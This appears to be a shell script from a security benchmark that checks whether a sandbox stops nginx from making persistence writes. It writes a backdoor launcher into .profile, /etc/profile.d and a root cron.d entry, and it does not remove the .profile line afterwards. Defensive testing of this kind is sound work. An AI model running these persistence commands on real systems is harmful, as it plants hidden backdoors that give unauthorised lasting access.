#!/usr/bin/env sh
# Tactic: Persistence (TA0003)
# Technique: Event Triggered Execution - Unix Shell Configuration Modification
#            (T1546.004); cron-style scheduled task (T1053.003)
# Attack: plant a payload in shell startup files and a cron drop directory so it
# re-runs later. nginx never writes to profile.d, .profile, or cron dirs.
# Marker: outcome=allowed if any persistence write succeeded, blocked if all
#         writes were prevented.
set -u
TAG="13-persistence-profile-cron"
KIND="attack"
LINE='* * * * * root /tmp/.bd >/dev/null 2>&1'
ok=1
{ echo '/tmp/.bd &' >> "$HOME/.profile"; } 2>/dev/null && ok=0
{ echo '/tmp/.bd &' > /etc/profile.d/zz-backdoor.sh; } 2>/dev/null && ok=0
{ echo "$LINE" > /etc/cron.d/backdoor; } 2>/dev/null && ok=0
rm -f /etc/profile.d/zz-backdoor.sh /etc/cron.d/backdoor 2>/dev/null || true
if [ "$ok" -eq 0 ]; then OUT="allowed"; else OUT="blocked"; fi
printf 'BENCH_RESULT tag=%s kind=%s outcome=%s rc=%s\n' "$TAG" "$KIND" "$OUT" "$ok"
